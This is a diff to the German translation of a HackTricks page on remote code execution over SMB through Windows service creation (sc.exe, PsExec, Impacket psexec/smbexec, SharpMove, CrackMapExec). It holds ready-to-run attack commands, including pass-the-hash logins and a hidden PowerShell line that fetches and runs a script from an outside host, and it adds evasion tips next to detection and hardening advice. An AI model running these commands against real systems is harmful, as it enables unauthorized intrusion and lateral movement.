@@ -2,25 +2,25 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Wie funktionieren sie
+## Wie funktionieren sie?
 
-Diese Techniken missbrauchen den Windows Service Control Manager (SCM) remote über SMB/RPC, um Befehle auf einem Zielhost auszuführen. Der allgemeine Ablauf ist:
+Diese Techniken missbrauchen den Windows Service Control Manager (SCM) remote über SMB/RPC, um Befehle auf einem Zielhost auszuführen. Der übliche Ablauf ist:
 
-1. Authentifizieren Sie sich am Ziel und greifen Sie auf den ADMIN$-Freigabe über SMB (TCP/445) zu.
-2. Kopieren Sie eine ausführbare Datei oder geben Sie eine LOLBAS-Befehlszeile an, die der Dienst ausführen wird.
-3. Erstellen Sie einen Dienst remote über SCM (MS-SCMR über \PIPE\svcctl), der auf diesen Befehl oder diese Binärdatei verweist.
-4. Starten Sie den Dienst, um die Payload auszuführen und optional stdin/stdout über ein benanntes Pipe zu erfassen.
-5. Stoppen Sie den Dienst und bereinigen Sie (löschen Sie den Dienst und alle abgelegten Binärdateien).
+1. Am Ziel authentifizieren und über SMB (TCP/445) auf den ADMIN$-Share zugreifen.
+2. Eine ausführbare Datei kopieren oder eine LOLBAS-Befehlszeile angeben, die der Service ausführen soll.
+3. Über SCM (MS-SCMR über \PIPE\svcctl) remote einen Service erstellen, der auf diesen Befehl oder diese Binärdatei verweist.
+4. Den Service starten, um die Payload auszuführen, und optional stdin/stdout über eine Named Pipe erfassen.
+5. Den Service stoppen und aufräumen (den Service sowie alle abgelegten Binärdateien löschen).
 
 Anforderungen/Voraussetzungen:
-- Lokaler Administrator auf dem Ziel (SeCreateServicePrivilege) oder explizite Rechte zur Dienstcreation auf dem Ziel.
-- SMB (445) erreichbar und ADMIN$-Freigabe verfügbar; Remote Service Management durch die Host-Firewall erlaubt.
-- UAC Remote Restrictions: Bei lokalen Konten kann die Tokenfilterung die Admin-Rechte über das Netzwerk blockieren, es sei denn, es wird der integrierte Administrator oder LocalAccountTokenFilterPolicy=1 verwendet.
-- Kerberos vs NTLM: Die Verwendung eines Hostnamens/FQDN ermöglicht Kerberos; die Verbindung über IP fällt oft auf NTLM zurück (und kann in gehärteten Umgebungen blockiert sein).
+- Lokaler Administrator auf dem Ziel (SeCreateServicePrivilege) oder explizite Berechtigungen zum Erstellen von Services auf dem Ziel.
+- SMB (445) muss erreichbar und der ADMIN$-Share verfügbar sein; Remote Service Management muss durch die Host-Firewall erlaubt sein.
+- UAC Remote Restrictions: Bei lokalen Konten kann die Token-Filterung den Zugriff eines Administrators über das Netzwerk blockieren, sofern nicht der integrierte Administrator oder LocalAccountTokenFilterPolicy=1 verwendet wird.
+- Kerberos vs. NTLM: Die Verwendung eines Hostnamens/FQDN aktiviert Kerberos; bei einer Verbindung über die IP-Adresse wird häufig auf NTLM zurückgegriffen (und dies kann in gehärteten Umgebungen blockiert sein).
 
 ### Manuelles ScExec/WinExec über sc.exe
 
-Das Folgende zeigt einen minimalen Ansatz zur Dienstcreation. Das Dienstbild kann eine abgelegte EXE oder ein LOLBAS wie cmd.exe oder powershell.exe sein.
+Das folgende Beispiel zeigt einen minimalen Ansatz zum Erstellen eines Services. Das Service-Image kann eine abgelegte EXE oder ein LOLBAS wie cmd.exe oder powershell.exe sein.
 ```cmd
 :: Execute a one-liner without dropping a binary
 sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
@@ -34,17 +34,17 @@ sc.exe \\TARGET start HTSvc
 sc.exe \\TARGET delete HTSvc
 ```
 Hinweise:
-- Erwarten Sie einen Timeout-Fehler beim Starten einer nicht als Dienst ausgeführten EXE; die Ausführung erfolgt dennoch.
-- Um OPSEC-freundlicher zu bleiben, bevorzugen Sie dateilose Befehle (cmd /c, powershell -enc) oder löschen Sie abgelegte Artefakte.
+- Beim Starten einer Nicht-Service-EXE ist ein Timeout-Fehler zu erwarten; die Ausführung erfolgt trotzdem.
+- Für eine OPSEC-freundlichere Vorgehensweise sollten dateilose Befehle (`cmd /c`, `powershell -enc`) bevorzugt oder abgelegte Artefakte gelöscht werden.
 
-Finden Sie detailliertere Schritte in: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/
+Weitere detaillierte Schritte finden sich unter: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>
 
-## Werkzeuge und Beispiele
+## Tools und Beispiele
 
 ### Sysinternals PsExec.exe
 
-- Klassisches Administrationswerkzeug, das SMB verwendet, um PSEXESVC.exe in ADMIN$ abzulegen, einen temporären Dienst (Standardname PSEXESVC) zu installieren und I/O über benannte Pipes zu proxyen.
-- Beispielverwendungen:
+- Klassisches Admin-Tool, das SMB verwendet, um PSEXESVC.exe in ADMIN$ abzulegen, einen temporären Service (Standardname PSEXESVC) zu installieren und die I/O über Named Pipes weiterzuleiten.
+- Beispielverwendungen:<sup>[[1]](#references)</sup>
 ```cmd
 :: Interactive SYSTEM shell on remote host
 PsExec64.exe -accepteula \\HOST -s -i cmd.exe
@@ -55,16 +55,16 @@ PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami 
 :: Customize the service name for OPSEC (-r)
 PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
 ```
-- Sie können direkt von Sysinternals Live über WebDAV starten:
+- Du kannst direkt über Sysinternals Live via WebDAV starten:
 ```cmd
 \\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
 ```
 OPSEC
-- Hinterlässt Ereignisse zur Installation/Deinstallation von Diensten (Der Dienstname ist oft PSEXESVC, es sei denn, -r wird verwendet) und erstellt C:\Windows\PSEXESVC.exe während der Ausführung.
+- Hinterlässt Ereignisse zur Installation/Deinstallation des Service (der Service-Name lautet häufig PSEXESVC, sofern nicht -r verwendet wird) und erstellt während der Ausführung C:\Windows\PSEXESVC.exe.
 
-### Impacket psexec.py (PsExec-ähnlich)
+### Impacket psexec.py (PsExec-like)
 
-- Verwendet einen eingebetteten RemCom-ähnlichen Dienst. Legt eine temporäre Dienst-Binärdatei (häufig mit randomisiertem Namen) über ADMIN$ ab, erstellt einen Dienst (standardmäßig oft RemComSvc) und leitet I/O über ein benanntes Pipe weiter.
+- Verwendet einen eingebetteten RemCom-ähnlichen Service. Legt über ADMIN$ eine kurzlebige Service-Binary ab (üblicherweise mit zufälligem Namen), erstellt einen Service (standardmäßig häufig RemComSvc) und proxyt die I/O über eine Named Pipe.
 ```bash
 # Password auth
 psexec.py DOMAIN/user:Password@HOST cmd.exe
@@ -79,77 +79,74 @@ psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe
 psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
 ```
 Artefakte
-- Temporäre EXE in C:\Windows\ (zufällige 8 Zeichen). Der Dienstname ist standardmäßig RemComSvc, es sei denn, er wird überschrieben.
+- Temporäre EXE in C:\Windows\ (8 zufällige Zeichen). Der Dienstname ist standardmäßig RemComSvc, sofern er nicht überschrieben wird.
 
 ### Impacket smbexec.py (SMBExec)
 
-- Erstellt einen temporären Dienst, der cmd.exe startet und ein benanntes Pipe für I/O verwendet. Vermeidet im Allgemeinen das Ablegen eines vollständigen EXE-Payloads; die Befehlsausführung ist semi-interaktiv.
+- Erstellt einen temporären Dienst, der cmd.exe startet und eine Named Pipe für I/O verwendet. Vermeidet im Allgemeinen das Ablegen einer vollständigen EXE-Payload; die Befehlsausführung ist halbinteraktiv.
 ```bash
 smbexec.py DOMAIN/user:Password@HOST
 smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
 ```
 ### SharpLateral und SharpMove
 
-- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementiert mehrere Methoden für laterale Bewegung, einschließlich servicebasiertem Exec.
+- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementiert mehrere Methoden für laterale Bewegungen, einschließlich service-based exec.
 ```cmd
 SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
 ```
-- [SharpMove](https://github.com/0xthirteen/SharpMove) umfasst die Modifikation/Erstellung von Diensten, um einen Befehl aus der Ferne auszuführen.
+- [SharpMove](https://github.com/0xthirteen/SharpMove) umfasst die Änderung/Erstellung von Diensten, um einen Befehl remote auszuführen.
 ```cmd
 SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
 SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
 ```
-- Sie können auch CrackMapExec verwenden, um über verschiedene Backends (psexec/smbexec/wmiexec) auszuführen:
+- Du kannst CrackMapExec auch verwenden, um über verschiedene Backends (psexec/smbexec/wmiexec) Befehle auszuführen:
 ```bash
 cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
 cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
 ```
 ## OPSEC, Erkennung und Artefakte
 
-Typische Host-/Netzwerkartefakte bei der Verwendung von PsExec-ähnlichen Techniken:
-- Sicherheit 4624 (Anmeldetyp 3) und 4672 (Besondere Berechtigungen) auf dem Ziel für das verwendete Administratorkonto.
-- Sicherheit 5140/5145 Datei-Freigabe- und Datei-Freigabe-Detailevents, die den Zugriff auf ADMIN$ und das Erstellen/Schreiben von Dienstbinaries (z. B. PSEXESVC.exe oder zufällige 8-Zeichen .exe) zeigen.
-- Sicherheit 7045 Dienstinstallation auf dem Ziel: Dienstnamen wie PSEXESVC, RemComSvc oder benutzerdefiniert (-r / -service-name).
-- Sysmon 1 (Prozess erstellen) für services.exe oder das Dienstbild, 3 (Netzwerkverbindung), 11 (Datei erstellen) in C:\Windows\, 17/18 (Pipe erstellt/verbunden) für Pipes wie \\.\pipe\psexesvc, \\.\pipe\remcom_*, oder randomisierte Äquivalente.
-- Registrierungsartefakt für Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 auf dem Operator-Host (wenn nicht unterdrückt).
+Typische Host-/Netzwerk-Artefakte bei der Verwendung von PsExec-ähnlichen Techniken:
+- Security 4624 (Logon Type 3) und 4672 (Special Privileges) auf dem Zielsystem für das verwendete Administratorkonto.
+- Security 5140/5145 File Share- und File Share Detailed-Ereignisse, die den Zugriff auf ADMIN$ sowie das Erstellen/Schreiben von Service-Binaries anzeigen (z. B. PSEXESVC.exe oder eine zufällige 8-stellige .exe).
+- Security 7045 Service Install auf dem Zielsystem: Servicenamen wie PSEXESVC, RemComSvc oder benutzerdefinierte Namen (-r / -service-name).
+- Sysmon 1 (Process Create) für services.exe oder das Service-Image, 3 (Network Connect), 11 (File Create) in C:\Windows\, 17/18 (Pipe Created/Connected) für Pipes wie \\.\pipe\psexesvc, \\.\pipe\remcom_* oder entsprechende zufällige Varianten.
+- Registry-Artefakt für die Sysinternals-EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 auf dem Operator-Host (falls nicht unterdrückt).
 
-Jagdmöglichkeiten
-- Alarm bei Dienstinstallationen, bei denen der ImagePath cmd.exe /c, powershell.exe oder TEMP-Standorte enthält.
-- Suchen nach Prozesskreationen, bei denen ParentImage C:\Windows\PSEXESVC.exe oder Kinder von services.exe, die als LOCAL SYSTEM Shells ausführen, sind.
-- Benannte Pipes kennzeichnen, die mit -stdin/-stdout/-stderr enden oder bekannte PsExec-Klon-Pipenamen haben.
+Hunting-Ideen
+- Bei Service-Installationen alarmieren, wenn der ImagePath cmd.exe /c, powershell.exe oder TEMP-Verzeichnisse enthält.
+- Nach Prozesserstellungen suchen, bei denen ParentImage C:\Windows\PSEXESVC.exe ist, oder nach untergeordneten Prozessen von services.exe, die als LOCAL SYSTEM ausgeführt werden und Shells starten.
+- Benannte Pipes markieren, die auf -stdin/-stdout/-stderr enden, oder bekannte PsExec-Clone-Pipenamen verwenden.
 
-## Fehlersuche bei häufigen Fehlern
-- Zugriff verweigert (5) beim Erstellen von Diensten: nicht wirklich lokaler Administrator, UAC-Remote-Beschränkungen für lokale Konten oder EDR-Tampering-Schutz auf dem Dienstbinary-Pfad.
-- Der Netzwerkpfad wurde nicht gefunden (53) oder konnte nicht zu ADMIN$ verbinden: Firewall blockiert SMB/RPC oder Administrationsfreigaben sind deaktiviert.
-- Kerberos schlägt fehl, aber NTLM ist blockiert: Verbindung über Hostname/FQDN (nicht IP) herstellen, richtige SPNs sicherstellen oder -k/-no-pass mit Tickets bei der Verwendung von Impacket bereitstellen.
-- Dienststart läuft ab, aber Payload wurde ausgeführt: zu erwarten, wenn es sich nicht um ein echtes Dienstbinary handelt; Ausgabe in eine Datei erfassen oder smbexec für Live-I/O verwenden.
+## Fehlerbehebung bei häufigen Problemen
+- Access is denied (5) beim Erstellen von Services: kein echter lokaler Administrator, UAC-Remoteeinschränkungen für lokale Konten oder EDR-Manipulationsschutz für den Pfad des Service-Binaries.
+- The network path was not found (53) oder keine Verbindung zu ADMIN$: Firewall blockiert SMB/RPC oder Admin-Shares sind deaktiviert.
+- Kerberos schlägt fehl, aber NTLM ist blockiert: per Hostname/FQDN (nicht IP) verbinden, korrekte SPNs sicherstellen oder bei der Verwendung von Impacket -k/-no-pass mit Tickets angeben.
+- Der Start des Services läuft in einen Timeout, aber der Payload wurde ausgeführt: erwartetes Verhalten, wenn es sich nicht um ein echtes Service-Binary handelt; Ausgabe in eine Datei umleiten oder smbexec für Live-I/O verwenden.
 
-## Härtungsnotizen
-- Windows 11 24H2 und Windows Server 2025 erfordern standardmäßig SMB-Signierung für ausgehende (und Windows 11 eingehende) Verbindungen. Dies beeinträchtigt die legitime Verwendung von PsExec mit gültigen Anmeldeinformationen nicht, verhindert jedoch den Missbrauch von unsignierten SMB-Relay und kann Geräte beeinträchtigen, die keine Signierung unterstützen.
-- Neue SMB-Client-NTLM-Blockierung (Windows 11 24H2/Server 2025) kann NTLM-Fallback verhindern, wenn über IP oder zu Nicht-Kerberos-Servern verbunden wird. In gehärteten Umgebungen wird dies NTLM-basiertes PsExec/SMBExec brechen; verwenden Sie Kerberos (Hostname/FQDN) oder konfigurieren Sie Ausnahmen, wenn dies legitim erforderlich ist.
-- Prinzip der minimalen Berechtigung: Minimieren Sie die Mitgliedschaft im lokalen Administrator, bevorzugen Sie Just-in-Time/Just-Enough Admin, setzen Sie LAPS durch und überwachen/benachrichtigen Sie über 7045-Dienstinstallationen.
+## Hinweise zur Härtung
+- Windows 11 24H2 und Windows Server 2025 erfordern standardmäßig SMB signing für ausgehende (und unter Windows 11 eingehende) Verbindungen. Dies verhindert die legitime Verwendung von PsExec mit gültigen Zugangsdaten nicht, verhindert jedoch unsigned SMB relay abuse und kann Geräte beeinträchtigen, die signing nicht unterstützen.<sup>[[2]](#references)</sup>
+- Das neue NTLM-Blocking des SMB-Clients (Windows 11 24H2/Server 2025) kann den NTLM-Fallback verhindern, wenn eine Verbindung per IP oder zu Servern ohne Kerberos hergestellt wird. In gehärteten Umgebungen wird dadurch NTLM-basiertes PsExec/SMBExec unterbrochen; Kerberos verwenden (Hostname/FQDN) oder, falls legitim erforderlich, Ausnahmen konfigurieren.<sup>[[2]](#references)</sup>
+- Prinzip der geringsten Privilegien: Mitgliedschaften in der Gruppe der lokalen Administratoren minimieren, Just-in-Time/Just-Enough Admin bevorzugen, LAPS erzwingen sowie Service-Installationen mit Ereignis 7045 überwachen und entsprechende Alarme einrichten.
 
 ## Siehe auch
 
-- WMI-basiertes Remote-Exec (oft mehr fileless):
-
+- WMI-based remote exec (oft stärker fileless):
 
 {{#ref}}
 ./wmiexec.md
 {{#endref}}
 
-- WinRM-basiertes Remote-Exec:
-
+- WinRM-based remote exec:
 
 {{#ref}}
 ./winrm.md
 {{#endref}}
 
-
-
 ## Referenzen
 
-- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
-- SMB-Sicherheits-Härtung in Windows Server 2025 & Windows 11 (Standardmäßig signieren, NTLM-Blockierung): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591
+- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
+- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
+- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 
 {{#include ../../banners/hacktricks-training.md}}
